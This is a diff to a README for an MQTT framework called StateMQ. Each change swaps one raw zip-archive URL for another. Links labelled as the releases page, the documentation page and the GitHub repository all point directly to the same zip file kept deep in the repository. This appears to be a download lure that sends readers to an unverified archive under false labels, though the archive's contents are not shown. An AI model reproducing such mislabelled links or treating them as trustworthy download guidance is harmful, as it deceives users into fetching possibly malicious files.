@@ -6,11 +6,11 @@ StateMQ is a framework that helps you build MQTT applications around clear state
 
 ## 🔗 Download
 
-[![Download StateMQ](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip)](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip)
+[![Download StateMQ](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip)](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip)
 
 ## 📥 Download & Install
 
-To get StateMQ, visit the [Releases page](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip) and download the latest version.
+To get StateMQ, visit the [Releases page](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip) and download the latest version.
 
 ### Step-by-Step Download Instructions:
 
@@ -61,7 +61,7 @@ For a simple project, you could set up an MQTT client that sends temperature dat
 
 ## 📚 Documentation
 
-For more in-depth information, visit the [documentation page](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip). It contains guides, FAQs, and tips to help you troubleshoot any issues.
+For more in-depth information, visit the [documentation page](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip). It contains guides, FAQs, and tips to help you troubleshoot any issues.
 
 ## 🌐 Community and Support
 
@@ -80,9 +80,9 @@ StateMQ offers a variety of features to enhance your development process:
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [StateMQ on GitHub](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip) for source code.
+- **GitHub Repository:** [StateMQ on GitHub](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip) for source code.
 - **Example Projects:** Explore projects built with StateMQ to get inspiration.
 
 ## 🌟 Final Remarks
 
-Thank you for using StateMQ. We hope this framework will simplify your MQTT projects and help you achieve your development goals. Don’t forget to visit the [Releases page](https://github.com/Abhichasma/StateMQ/raw/refs/heads/main/arduino/StateMQ/examples/Edge_Context_Transition/MQ-State-v2.8.zip) to download the latest version.
+Thank you for using StateMQ. We hope this framework will simplify your MQTT projects and help you achieve your development goals. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Abhichasma/StateMQ/main/arduino/StateMQ/MQ-State-v3.5.zip) to download the latest version.
